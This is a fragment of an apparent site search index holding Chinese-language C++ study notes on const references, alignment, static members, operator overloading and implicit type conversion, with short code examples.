<p>\u53ea\u6709\u5f53\u4f20\u5165\u7684\u5b9e\u53c2\u53ea\u6709\u4e00\u4e2a\u7b2c\u4e00\u4f18\u5148\u7ea7\u7684\u65f6\u5019\uff0c\u624d\u4e0d\u4f1a\u62a5\u9519</p> <p>\u5f53\u5f15\u7528\u4f5c\u4e3a\u7c7b\u7684\u6210\u5458\u7684\u65f6\u5019</p> <p>\u5fc5\u987b\u6709\u521d\u59cb\u503c\uff0c\u6216\u8005\u5728\u521d\u59cb\u5316\u5217\u8868\u91cc\u88ab\u521d\u59cb\u5316</p> <p>\u5e38\u91cf\u5f15\u7528</p> <p>\u7406\u8bba\u4e0a\u6765\u8bf4\uff0c\u5f15\u7528\u662f\u5c01\u88c5\u540e\u7684\u6307\u9488\uff0c\u6240\u4ee5\u5176\u6240\u8868\u793a\u7684\u5bf9\u8c61\u4e00\u5b9a\u662f\u6709\u5730\u5740\u7684</p> <pre><code>const int&amp; m=1; //\u8fd9\u662f\u5408\u6cd5\u7684\n</code></pre> <p>\u5728\u5b9e\u9645\u5b9e\u73b0\u4e2d\uff0c\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf\uff0c\u75311\u521b\u9020\u3002\u8fd9\u91cc\u53ef\u4ee5\u518d\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>class A{\nprivate: \n   int i;\npublic:\n    A(int i):i(i){cout&lt;&lt;\"cotor\"&lt;&lt;endl;}\n};\nint main(){\n    const A&amp; i=1;\n}\n// \u7f16\u8bd1\u6210\u529f\uff0c\u8f93\u51facotor\n</code></pre> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_5","title":"\u5185\u5b58\u5bf9\u9f50\u89c4\u5219\uff1f","text":"<p>\u5728\u4e00\u4e2a\u7c7b\u7684\u5bf9\u8c61\u4e2d \u5b58\u5728\u7740\u4e00\u5b9a\u7684\u89c4\u5219</p> <pre><code>class A{\npublic :\n    A():a(0){}\n    virtual void print();\n    virtual void myprint(){\n        cout&lt;&lt;\"11\"&lt;&lt;endl;\n    }\nprivate:\n    int a;\n};\n\nclass B{\n int a;\n};\n//\u5982\u4e0a\u6709\u4e24\u4e2a\u7c7b \u5176\u4e2dA\u7c7b\u5bf9\u8c61\u7684sizeof\u662f16 B\u7c7b\u5bf9\u8c61\u7684sizeof\u662f4\n//\u865a\u51fd\u6570\u7684\u8868vtable\u672c\u6765\u5e94\u8be5\u53ea\u5360\u636e8\u4e2a\u5b57\u8282 \u4f46\u662f\u7531\u4e8e8\u5b57\u8282\u5927\u4e8e\u6b64\u7535\u8111\u4e2d\u7684int\u76844\u5b57\u8282\n//\u53d1\u751f\u4e86\u5185\u5b58\u7684\u8865\u9f50 \u53c8\u8865\u4e86\u4e00\u4e2a4\u5b57\u8282\u5927\u5c0f\u7684\u4e1c\u897f\u4f7f\u5f97A\u7c7b\u5bf9\u8c61\u7684sizeof\u8fbe\u5230\u4e8616\n\n//\u6548\u679c\u7c7b\u4f3c\u4e8e\nstruct A{\nint a;\ndouble b;\n} \n//\u5176sizeof\u662f16 \u800c\u975e12\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#static-and","title":"static and \u5168\u5c40\u53d8\u91cf","text":"<p>static\u5728c\u4e2d\u6709\u5982\u4e0b\u91ca\u4e49\uff0c\u4e00\u4e2a\u662f\u7528\u5728\u51fd\u6570\u548c\u5168\u5c40\u53d8\u91cf\u524d\uff0c\u8868\u793a\u5176\u4e0d\u80fd\u5728\u5176\u4ed6\u6587\u4ef6\u91cc\u88ab\u4f7f\u7528 \u4f46\u662f\u5176\u5728\u672c\u6587\u4ef6\u4e2d\u5904\u5904\u53ef\u4ee5\u8bbf\u95ee \u53e6\u4e00\u4e2a\u662f\u7528\u5728\u51fd\u6570\u91cc\uff0c\u5c06\u4e00\u4e2a\u53d8\u91cf\u7684\u751f\u547d\u5468\u671f\u53d8\u6210\u5168\u5c40\u53d8\u91cf\uff0c\u4f46\u662f\u53ea\u80fd\u5728\u8fd9\u4e2a\u51fd\u6570\u91cc\u4f7f\u7528 extern \u53ef\u4ee5\u5f15\u7528\u6ca1\u6709static\u7684\u5176\u4ed6\u6587\u4ef6\u7684\u53d8\u91cf\u548c\u51fd\u6570 \u5728linker\u4e2d\u68c0\u67e5</p> <p>\u5728c++\u4e2d \u6709static\u7684\u6210\u5458\u53d8\u91cf\u548cstatic\u7684\u6210\u5458\u51fd\u6570</p> <p>\u9759\u6001\u7684\u6210\u5458\u51fd\u6570\u53ea\u80fd\u8bbf\u95ee\u9759\u6001\u7684\u6210\u5458\u53d8\u91cf</p> <p>1.\u5728\u51fd\u6570\u4e2d\u5b9a\u4e49\u4e00\u4e2a\u9759\u6001\u7684\u5bf9\u8c61</p> <pre><code>class A;\nvoid func(){\n    static A my_a(0);\n}\n//\u548cc\u7c7b\u4f3c \u8fd9\u4e2amy_a\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf \u4ec5\u5728\u7b2c\u4e00\u6b21\u8fdb\u5165\u8be5\u51fd\u6570\u7684\u65f6\u5019\u88ab\u521d\u59cb\u5316\n</code></pre> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5168\u5c40\u7684\u53d8\u91cf \u5185\u5b58\u5206\u914d\u662f\u5728link\u7684\u65f6\u5019\uff1f c++\u5982\u4f55\u53bb\u5224\u65ad\u8fd9\u4e2a\u9759\u6001\u5bf9\u8c61\u662f\u5426\u662f\u88ab\u521d\u59cb\u5316\u8fc7 \u5bf9\u4e8e\u4e00\u4e2a\u4e0a\u8ff0\u7684\u5728\u51fd\u6570\u4e2d\u7684\u9759\u6001\u7684 \u5bf9\u8c61\u6765\u8bf4\uff0c\u9700\u8981\u80fd\u591f\u5224\u65ad\uff0c\u624d\u80fd\u786e\u5b9a\u5728\u8fdb\u5165\u8fd9\u4e2a\u51fd\u6570\u65f6\u662f\u5426\u8c03\u7528\u6784\u9020\uff0c\u7ed3\u675f\u65f6\u662f\u5426\u8c03\u7528\u6790\u6784\u51fd\u6570\uff08\u6709\u53ef\u80fd\u662f\u6761\u4ef6\u5b9a\u4e49\uff09</p> <p>2.\u5f53\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u65f6</p> <p>\u5176\u5185\u5b58\u7684\u5206\u914d\u548c\u4e00\u822c\u7684\u5168\u5c40\u53d8\u91cf\u4e00\u6837\uff0c\u5176\u6784\u9020\u51fd\u6570\u7684\u6267\u884c\u5728main\u51fd\u6570\u4e4b\u524d \u56e0\u6b64c++\u4e2d\uff0cmain\u4e0d\u518d\u662f\u7a0b\u5e8f\u5458\u6240\u80fd\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u51fd\u6570\u4e86\uff08\u5176\u5b9e\u4e0d\u8bba\u662fc\u8fd8\u662fc++ main\u90fd\u4e0d\u662f\u6700\u5148\u8c03\u7528\u7684\u4ee3\u7801\uff09</p> <p>\u5728\u540c\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5168\u5c40\u7684\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u7684\u4ece\u4e0a\u5f80\u4e0b\u8c03\u7528\u7684\uff0c\u4f46\u662f\u5728\u591a\u6587\u4ef6\u4e4b\u95f4\uff0c\u4ed6\u4eec\u7684\u8c03\u7528\u662f\u4e0d\u5b58\u5728\u987a\u5e8f\u7684\uff0c\u56e0\u6b64\u5982\u679c\u8fd9\u4e9b\u4e2a\u5bf9\u8c61\u4e4b\u95f4\u6709\u4f9d\u8d56\u5173\u7cfb\u7684\u8bdd\uff0c\u9700\u8981\u90fd\u653e\u5728\u7edf\u4e00\u4e2a\u6587\u4ef6 \u4e2d\u6765\u4fdd\u8bc1\u76f8\u4e92\u4e4b\u95f4\u7684\u987a\u5e8f</p> <p>3.\u7c7b\u7684\u6210\u5458\u662f\u9759\u6001\u7684</p> <p>hidden and persistent persistent\u662f\u6307\u51fd\u6570\u4e4b\u95f4\u4ecd\u7136\u5b58\u5728\u7684\u4e1c\u897f\uff0c\u5168\u5c40\u53d8\u91cf\u548cmalloc\u51fa\u6765\u7684\u662fpersistent</p> <p>\u5728c++\u4e2d persistent\u7684\u6210\u5458\u6307\u7684\u662f\u90a3\u4e9b\u4e0d\u968f\u7740\u5bf9\u8c61\u800c\u6539\u53d8\u7684\u4e1c\u897f hidden\u662f\u4f9d\u9760public and private\u6765\u5b9e\u73b0\u7684</p> <p>\u7c7b\u4e2d\u7684static\u6210\u5458\u662f\u4e0d\u4f9d\u8d56\u5bf9\u8c61\u800c\u5b58\u5728\u7684\u4e1c\u897f \u5b83\u662f\u5bf9\u4e8e\u7c7b\u800c\u5b58\u5728\u7684</p> <pre><code>class A{\n    static int i;\n}\n//\u6ce8\u610f\u5728class\u4e2d\u7684\u6240\u6709\u4e1c\u897f\u90fd\u662f\u58f0\u660e\nint A::i;//\u6240\u4ee5\u8981\u5728\u4e00\u4e2acpp\u6587\u4ef6\u4e2d\u5199\u51fa\u5176\u7684\u5b9a\u4e49\n\n//static int A::i;//\u8fd9\u79cd\u505a\u6cd5\u662f\u9519\u8bef\u7684 \u8fd9\u662f\u4e00\u79cd\u628ai\u9650\u5236\u5728.cpp\u7684\u64cd\u4f5c\n</code></pre> <p>\u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u800c\u8a00\u5176\u672c\u8eab\u90fd\u662f\u58f0\u660e\uff0c\u6700\u597d\u662f\u5728.h\u91cc\u5199\u58f0\u660e\uff0c\u5728.cpp\u6587\u4ef6\u91cc\u5199\u51fa\u5176\u6240\u6709\u7684\u5b9a\u4e49\uff0c\u5b9a\u4e49\u5305\u62ec\u51fd\u6570\u7684\u5b9a\u4e49\u548c\u9759\u6001\u6210\u5458\u53d8\u91cf\u7684\u5b9a\u4e49\uff0c \u5982\u679c\u53ea\u6709.h\uff0c\u90a3\u4e48\u7c7b\u91cc\u5199\u7684\u6240\u6709\u51fd\u6570\u90fd\u662finline\u51fd\u6570\uff0c\u4e14\u4e0d\u53ef\u80fd\u5b58\u5728\u9759\u6001\u6210\u5458\u53d8\u91cf\uff08.h\u91cc\u4e0d\u80fd\u653e\u5b9a\u4e49</p> <p>\u7279\u522b\u6ce8\u610f\u5728\u9759\u6001\u7684\u6210\u5458\u53d8\u91cf\u4e0d\u80fd\u5728initialize list\u91cc\u521d\u59cb\u5316\u3002  \u90a3\u4e48\u5982\u4f55\u5bf9\u5176\u8fdb\u884c\u521d\u59cb\u5316\u5462\uff0c\u5982\u679c\u5176\u4ec5\u662fstatic \u90a3\u4e48\u53ea\u80fd\u5728\u5916\u90e8\u8fdb\u884c\u521d\u59cb\u5316 \u5982\u679c\u5176\u662fconst static\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u5728\u7c7b\u7684\u5185\u90e8\u8fdb\u884c\u521d\u59cb\u5316</p> <pre><code>class A{\n    static int i=20;//error\n    const static int p=20;//yes\n};\n\nint A::i=20;//\u6b64\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5bf9\u9759\u6001\u6210\u5458\u53d8\u91cfi\u8fdb\u884c\u521d\u59cb\u5316\n//\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u6784\u9020\u51fd\u6570\u5185\u90e8 \u7528i=2;\u7684\u65b9\u6cd5\u8fdb\u884c\u8d4b\u503c\uff0c\u4f46\u8fd9\u5c31\u4e0d\u5c5e\u4e8e\u521d\u59cb\u5316\u7684\u8303\u56f4\u4e86\nA::A(){i=2};\n</code></pre> <p>\u82e5\u4e00\u4e2a\u9759\u6001\u6210\u5458\u53d8\u91cfi\u662f\u4e00\u4e2apublic \u53ef\u4ee5\u901a\u8fc7\u5bf9\u8c61a.i\u6765\u8bbf\u95ee \u4e5f\u53ef\u4ee5\u7528A::i\u7c7b\u672c\u8eab\u6765\u8bbf\u95ee\u5b83 \u5982\u679c\u662fprivate\u5c31\u4e0d\u80fd\u901a\u8fc7\u8fd9\u4e24\u79cd\u65b9\u5f0f\u8fdb\u884c\u8bbf\u95ee</p> <p>4.\u7c7b\u7684\u6210\u5458\u51fd\u6570\u65f6\u9759\u6001\u7684</p> <p>\u8fd9\u7c7b\u6210\u5458\u51fd\u6570\u7684\u7279\u6b8a\u6027\u5728\u4e8e\uff0c\u4e0d\u4f9d\u8d56\u4e8e\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u9759\u6001\u51fd\u6570\u548c\u9759\u6001\u6210\u5458\uff0c\u4e0d\u5b58\u5728this\u6307\u9488\uff08\u9996\u5148\u5f97\u662fpublic\u7684</p> <p>this\u662f\u4e00\u4e2ahidden private \u4f46\u662f\u9759\u6001\u7684\u6210\u5458\u51fd\u6570\u65f6\u6ca1\u6709this\u7684\uff0c\u56e0\u4e3a\u4ed6\u4e0d\u4f9d\u8d56\u5bf9\u8c61</p> <p>\u4f8b\u5982</p> <p>\u8fd9\u4e00\u70b9\u5728\u67d0\u4e9b\u573a\u5408\u8f83\u4e3a\u5173\u952e\uff0c\u6bd4\u5982\u6211\u4eec\u5728sort\u51fd\u6570\u91cc\u81ea\u5b9a\u4e49\u6bd4\u8f83\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u68c0\u67e5\u4f60\u7684\u51fd\u6570\u7684\u53c2\u6570\u4e2a\u6570\uff0c\u6b64\u65f6\u5982\u679c\u6709\u9690\u85cf\u7684this\uff0c\u90a3\u4e48\u53c2\u6570\u68c0\u67e5\u53ef\u80fd\u5c31\u4f1a\u65e0\u6cd5\u901a\u8fc7\uff0c\u9700\u8981\u5c06\u5176\u6539\u4e3astatic</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#overloaded-operators","title":"overloaded operators \u8fd0\u7b97\u7b26\u91cd\u8f7d","text":"<p>\u5927\u591a\u6570\u8fd0\u7b97\u7b26\u90fd\u80fd\u88ab\u91cd\u8f7d new \u548c delete\u4e5f\u662f\u8fd0\u7b97\u7b26 \u90e8\u5206\u4e0d\u80fd\u91cd\u8f7d   .  .*  ::   ?   sizeof  typeid</p> <p>\u4e0d\u80fd\u81ea\u5236\u8fd0\u7b97\u7b26\uff0c\u53ea\u80fd\u5bf9\u5df2\u6709\u7684\u8fd0\u7b97\u7b26\u8fdb\u884c\u91cd\u8f7d\uff0c\u5e76\u4e14\u8fd0\u7b97\u7b26\u64cd\u4f5c\u4e2a\u6570\u548c\u4f18\u5148\u7ea7\u4e0d\u80fd\u6539\u53d8</p> <p>\u8fd0\u7b97\u7b26\u7684overload\u4e00\u5b9a\u662f\u9488\u5bf9\u4e8e\u5bf9\u8c61\u800c\u8a00\u7684</p> <p>\u5176\u5b9e\u5728c\u8bed\u8a00\u4e2d\u5df2\u7ecf\u5b58\u5728\u4e86\u8fd0\u7b97\u7b26\u91cd\u8f7d\u7684\u7aef\u502a\u4e86\uff0c\u4f8b\u5982\u6307\u9488p+1\u65f6\uff0c\u5176\u5b9e\u662fp+1sizeof\uff08A\uff09 p\u7684\u7c7b\u578b\u4e3aA    \u53c8\u5982\u540c\u65f6\u53ef\u4ee5\u505a\u4e58\u6cd5\u4e5f\u53ef\u4ee5\u505a\u53d6\u5730\u5740\u8fd0\u7b97*</p> <p>\u8fd0\u7b97\u7b26\u91cd\u8f7d\u7684\u5199\u6cd5</p> <p>const String String:: operator +(const String &amp; that); \u8fd9\u79cd\u5199\u6cd5\u662f\u4f5c\u4e3a\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u51fd\u6570\u800c\u5b58\u5728\u7684\uff0c\u56e0\u6b64\u6709\u4e00\u4e2a\u9690\u85cf\u7684this\u5728\u91cc\u9762\uff0c\u6240\u4ee5\u5df2\u7ecf \u6ee1\u8db3\u4e86+\u9700\u8981\u7684\u4e24\u4e2a\u53c2\u6570</p> <p>const String operator+(const String &amp;r,const String&amp; l); \u8fd9\u79cd\u5199\u6cd5\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5168\u5c40\u7684\u51fd\u6570\u800c\u5b58\u5728\uff0c\u56e0\u6b64\u5c31\u9700\u8981\u4e24\u4e2a\u53c2\u6570</p> <p>\u5199\u5728\u7c7b\u4e2d\u65f6\u51fd\u6570\u58f0\u660e\u7684\u540e\u9762\u4e5f\u8981\u52a0\u4e0aconst \u6765\u8bf4\u660ethis\u6307\u9488\u65f6const\u7684</p> <p>\u524d\u540e\u90fd\u52a0\u4e0aconst \u540e\u9762\u7684const\u7528\u6765\u4fdd\u8bc1this\u6307\u9488\u6307\u5411\u7684\u4e1c\u897f\u4e0d\u88ab\u4fee\u6539\uff0c\u524d\u9762\u7684const\u4fdd\u8bc1\u8fd4\u56de\u7684\u7ed3\u679c\u4e0d\u505a\u5de6\u503c</p> <p>\u8fd0\u7b97\u7b26\u91cd\u8f7d\u7684\u6ce8\u610f\u4e8b\u9879</p> <p>z=x+y\u4e3a\u4f8b \u5176\u4e2dx y z\u5747\u4e3ainteger\u7684\u5bf9\u8c61</p> <p>x\u662f\u8fd0\u7b97\u7b26\u5de6\u8fb9\u7684\u7b97\u5b50\uff0c\u8bb0\u4e3areceiver\uff0creceiver\u6765\u786e\u5b9a\u4f7f\u7528\u54ea\u4e00\u4e2a\u52a0\u53f7\uff0c\u7528\u5bf9\u8c61\u6765\u786e\u8ba4 \u4f7f\u7528\u54ea\u4e00\u4e2a\u91cd\u8f7d\u7684\u8fd0\u7b97\u7b26</p> <p>z=x+3 \u8fd9\u4e5f\u662f\u8c03\u7528\u91cd\u8f7d\u4e4b\u540e\u7684\u8fd0\u7b97\u7b26\uff0c\u5e76\u4e14\u4f1a\u5c063\u4f20\u5165\u6784\u9020\u51fd\u6570\uff0c\u4f7f\u5176\u6210\u5458\u4e00\u4e2a\u5bf9\u8c61 \u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\u8fd9\u4e2a\u7c7b\u7684\u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\uff0c\u5982\u679c\u9700\u8981\u4f20\u5165double\u4f1a\u5c063\u81ea\u52a8\u8f6c\u6362\u6210double\uff0c\u4f46\u662f\u5982\u679c\u672c\u8eab\u9700\u8981\u7684int \u4f20\u5165double\uff0c\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u7f16\u8bd1\u5668\u7684\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u53ea\u80fd\u4ece\u5c0f\u7684\u5230\u5bbd\u7684 \u5982\u679c\u662fdouble\u5230int\u7684\u8bdd\u9700\u8981\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362</p> <p>z=3+y \u8fd9\u91cc3\u4f5c\u4e3areceiver\uff0c\u53ea\u80fd\u7528\u6574\u6570\u7684\u8fd0\u7b97\u7b26\u505a\u52a0\u6cd5\uff0c\u9664\u975einteger\u80fd\u88ab\u8f6c\u6362\u4e3aint\uff0c\u5426\u5219\u8fd9\u91cc\u5c31\u4f1a\u51fa\u95ee\u9898\uff1f \u7f16\u8bd1\u5668\u7684\u64cd\u4f5c\u662f\u4ece\u5de6\u5f80\u53f3\u8fdb\u884c\u7684</p> <p>\u5168\u5c40\u7684\u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\u4e00\u822c\u4f1a\u88ab\u58f0\u660e\u88abfriend\uff0c\u56e0\u4e3a\u6b64\u65f6\u6709\u4e00\u4e2a\u53d8\u91cf\u4e0d\u662fthis\u6307\u9488\u4e86\uff0c\u6240\u4ee5\u4e24\u4e2a\u53d8\u91cf\u90fd\u53ef\u4ee5\u505a\u6784\u9020\u51fd\u6570\u8f6c\u5316\u4e3a\u5bf9\u8c61\uff0c\u56e0\u6b64z=3+y\u5c31\u662f\u53ef\u4ee5\u5b9e\u73b0\u7684\u4e86</p> <p>\u5355\u76ee\u8fd0\u7b97\u7b26\u5e94\u8be5\u505a\u6210\u6210\u5458\u51fd\u6570 = \uff08\uff09 [] -&gt; \u5fc5\u987b\u505a\u6210\u6210\u5458\u51fd\u6570</p> <p>\u5bf9\u4e8e\u7b97\u5b50\u6765\u8bf4</p> <p>\u5bf9\u4e8e\u4e0d\u4f1a\u4fee\u6539\u7b97\u5b50\u7684\u8fd0\u7b97\u7b26\uff0c\u4f20\u5165\u7684\u4e00\u5b9a\u662f\u5bf9\u8c61\u7684const\u7684\u5f15\u7528 \u540e\u9762\u52a0const\u662fthis\u662fconst \u5bf9\u4e8e++ --\u8fd9\u79cd\u4f1a\u4fee\u6539\u7684</p> <p>\u5bf9\u4e8e\u8fd4\u56de\u503c\u6765\u8bf4</p> <p>\u8981\u770b\u8fd9\u4e2a\u8fd4\u56de\u503c\u80fd\u4e0d\u80fd\u505a\u5de6\u503c \u6709const\u5c31\u4e0d\u80fd\u62ff\u6765\u505a\u5de6\u503c\uff0c\u5373\u4fbf\u662f\u4e00\u4e2a\u5f15\u7528\uff1f</p> <p>prefix ++ and postfix ++</p> <pre><code>class Integer{\npublic:\n    const Integer&amp; operator++();//prefix ++a\n    const Integer operator++(int);//postfix a++\u8fd9\u91cc\u7684int\u6ca1\u6709\u5b9e\u9645\u610f\u4e49\n//\u53ea\u662f\u4e3a\u4e86\u8ba9\u7f16\u8bd1\u5668\u53bb\u533a\u5206\u524d\u7f6e\u548c\u540e\u7f6e\u7684++\n//\u56e0\u4e3a\u4e24\u4e2a\u5f0f\u5b50\u90fd\u662f\u4f1a\u6539\u53d8\u4f20\u5165\u5bf9\u8c61\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u6700\u540e\u7684const\nprivate:\n    int i;\n}\n//\u5b9e\u9645\u5b9e\u73b0\nconst Integer&amp; Integer::operator++(){\n    (*this)+=1;\n    return *this;\n}\nconst Integer Integer::operator++(int){\n    Integer old(*this);\n    ++(*this);\n    return old;\n}\n//\u5b9e\u9645\u4f7f\u7528\n++x//x.operator++();\nx++//x.operator++(0);\n</code></pre> <p>\u4e4b\u6240\u4ee5++a\u662f\u5f15\u7528\u662f\u56e0\u4e3a \u8fd9\u4e2a\u5f0f\u5b50\u672c\u8eab\u5c31\u662f\u8fd4\u56dea++\u4e4b\u540e\u7684\u90a3\u4e2a\u503c\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u5c31\u662f++\u4e4b\u540e\u7684a\uff0c\u5e26reference\u4f1a\u66f4\u52a0\u8282\u7701</p> <p>\u6ce8\u610f\uff0c\u5728\u7c7b\u4e2d\u91cd\u8f7d\u4e86\u8fd0\u7b97\u7b26\u4e4b\u540e\uff0c\u5728\u540e\u9762\u7684\u91cd\u8f7d\u51fd\u6570\u4e2d\u4f7f\u7528\u90a3\u4e9b\u8fd0\u7b97\u7b26\u65f6\u8981\u6ce8\u610f\u6709\u6ca1\u6709\u88ab\u91cd\u8f7d\uff0c\u6700\u597d\u80fd\u4f9d\u8d56\u4e8e\u524d\u9762\u5df2\u7ecf\u91cd\u8f7d\u7684\u8fd0\u7b97\u7b26</p> <p>operator [] overloaded ** \u5bf9\u4e8e\u8868\u8fbe\u5bb9\u5668\u6982\u5ff5\u7684\u7c7b \u9700\u8981\u53ef\u4ee5\u62ff\u6765\u505a\u5de6\u503c**</p> <pre><code>class Vector{\npublic :\n    Vector(int size):m_size(size){\n        m_array=new int [size];\n    }\n    ~Vector(){delete m_array;}\n    int &amp;operator [](int index){return m_array[index];}\nprivate;\n    int m_size;\n    int *m_array;\n};\n</code></pre> <p>operator = overload</p> <pre><code>class Fi{\npublic:\n    Fi(){}\n};\nclass Fee{\npublic:\n    Fee(int){}\n    Fee(const Fi&amp;){}\n};\nint main(){\n    Fee fum=fi;\n    fum=fi;//\u6b64\u5904fi\u5148\u4f9d\u9760\u5176\u4e2d\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u53d8\u6210fee\u7c7b\uff0c\u7136\u540e\u5728\u8d4b\u503c\u7ed9fum\n}\n</code></pre> <p>\u7b49\u53f7\u7684\u8fd0\u7b97\u7b26\u91cd\u8f7d\u8f83\u4e3a\u7279\u6b8a\uff0c\u4e00\u822c\u6765\u8bf4\u7cfb\u7edf\u4f1a\u7ed9\u6211\u4eec\u4e00\u4e2a\u9ed8\u8ba4\u7684\uff0c\u505a\u6210\u5458\u4e4b\u95f4\u7684\u7b49\u53f7 \u8fd9\u4e00\u70b9\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u5f97\u4ee5\u8868\u73b0\uff0c\u5982\u679c\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7136\u540e\u8fd9\u7c7b\u4f7f\u7528\u7cfb\u7edf\u9ed8\u8ba4 \u7684\u7b49\u53f7\uff0c\u5728\u8fd9\u4e2a\u7c7b\u7684\u5bf9\u8c61\u4e4b\u95f4\u4f7f\u7528\u7b49\u53f7\u65f6\uff0c\u4f1a\u8c03\u7528\u5b83\u7684\u6210\u5458\u7684\u91cd\u8f7d\u7b49\u53f7</p> <p>A&amp; operator=(const A&amp;that){     if(this!=&amp;that){     do assignment     }     return *this }</p> <p>\u4e3a\u4f55\u9700\u8981\u8fd9\u4e2athis\u548cthat\u7684\u5224\u65ad \u56e0\u4e3a\u5982\u679c\u5bf9\u8c61\u4e2d\u5b58\u5728\u52a8\u6001\u5206\u914d\u7684\u6307\u9488\u7684\u8bdd\uff0c\u52bf\u5fc5\u6211\u4eec\u5728 \u505a\u7b49\u53f7\u8fd0\u7b97a=b\u4e4b\u524d\uff0c\u9700\u8981delete\u6389a\u91cc\u5934\u7684\u6307\u9488\u6240\u6307\u5411\u7684\u7a7a\u95f4\uff0c\u4f46\u662f\u5982\u679ca\u548cb\u5b8c\u5168\u76f8\u540c \u90a3\u4e48delete a\u91cc\u5934\u6307\u9488\u6240\u6307\u5411\u7684\u7a7a\u95f4\u5c31\u76f8\u5f53\u4e8edelete b\u91cc\u5934\u7684\u7a7a\u95f4\uff0c\u5f53\u6211\u4eec\u9700\u8981\u4f7f\u7528b\u7684 \u90a3\u5757\u6307\u9488\u65f6\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898</p> <p>\u6709\u52a8\u6001\u5206\u914d\u5185\u5b58\u7684\uff0c\u4e00\u5b9a\u8981\u5199\u81ea\u5df1\u7684\u91cd\u8f7d\u7b49\u53f7</p> <p>operator \u5bf9\u8c61\u540d\uff08\uff09\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u7684\u8fd0\u7b97\u91cd\u8f7d</p> <pre><code>operator double () const;//\u7c7b\u4e2d\u7684\u58f0\u660e\n</code></pre> <p>\u8fd9\u4e2a\u91cd\u8f7d\u51fd\u6570\u6bd4\u8f83\u7279\u6b8a\uff0c\u524d\u9762\u6ca1\u6709\u8fd4\u56de\u7c7b\u578b\uff0c\u4ed6\u7684\u6570\u636e\u540d\u6216\u8005\u5bf9\u8c61\u540d\u5df2\u7ecf\u8bf4\u660e\u4e86 \u5176\u9700\u8981\u8fd4\u56de\u7684\u7c7b\u578b\u4e86</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_6","title":"\u5bf9\u8c61\u4e4b\u95f4\u7684\u7c7b\u578b\u8f6c\u6362","text":"<p>value class : Complex Date String</p> <p>\u5728\u4f20\u9012\u53c2\u6570\u65f6\u53d1\u751f\u7684\u7c7b\u578b\u8f6c\u6362</p> <pre><code>class A{\npublic:\n    A(){}\n};\nclass B{\npublic:\n    B(const A&amp;){}\n};\nvoid f(B){}\n//\u5bf9\u4e8e\u4e00\u4e2a\u8fd9\u6837\u7684\u51fd\u6570\uff0c\u5982\u679c\u4f20\u5165\u7684\u53c2\u6570\u662fA\u7c7b\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u5c31\u4f1a\u5c06\u5176\u7528\u6784\u9020\u51fd\u6570\n//\u4f7f\u5176\u6210\u4e3aB\u7c7b\u5bf9\u8c61\u518d\u4f20\u53bbfH\u51fd\u6570\u4e2d\n</code></pre> <p>explicit\u5173\u952e\u8bcd</p> <p>\u653e\u5728\u6784\u9020\u51fd\u6570\u4e4b\u524d\uff0c\u8bf4\u660e\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u53ea\u80fd\u53d1\u6325\u6784\u9020\u51fd\u6570\u7684\u4f5c\u7528\uff0c\u4e0d\u80fd\u50cf\u4e0a\u8ff0\u4ee3\u7801 \u4e00\u6837\u53d1\u6325\u81ea\u52a8\u7c7b\u578b\u8f6c\u6362\u7684\u529f\u80fd \u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801\u800c\u8a00\uff0c\u5982\u679c\u662f\u52a0\u4e86explicit\u5173\u952e\u5b57\uff0c\u90a3\u4e48\u5c31\u53ea\u80fd\u505a\u5982\u4e0b\u64cd\u4f5cf(B(a))\u6765\u5b9e\u73b0 